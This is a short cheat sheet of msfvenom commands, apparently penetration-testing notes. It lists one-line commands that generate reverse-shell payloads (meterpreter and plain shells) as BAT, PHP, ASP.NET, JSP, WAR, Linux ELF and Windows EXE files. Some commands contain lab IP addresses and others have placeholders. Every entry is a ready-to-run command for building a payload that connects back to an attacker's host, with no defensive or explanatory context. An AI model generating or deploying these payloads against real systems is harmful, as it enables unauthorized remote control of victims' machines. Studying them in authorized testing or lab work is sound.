## msfvenom

#### Reverse shell - BAT
```bash 
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.119.221  LPORT=5000 > reverse.bat
```

#### Reverse shell - PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.30.229 LPORT=443 -f raw > shell.php
```

#### Reverse shell - ASP.Net

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.229 LPORT=443 -f asp > meterpreter.asp
```

#### Reverse shell - JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

#### Reverse shell - WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```


#### Reverse shell - ELF (Linux)

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

#### Reverse shell (Windows Exe)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```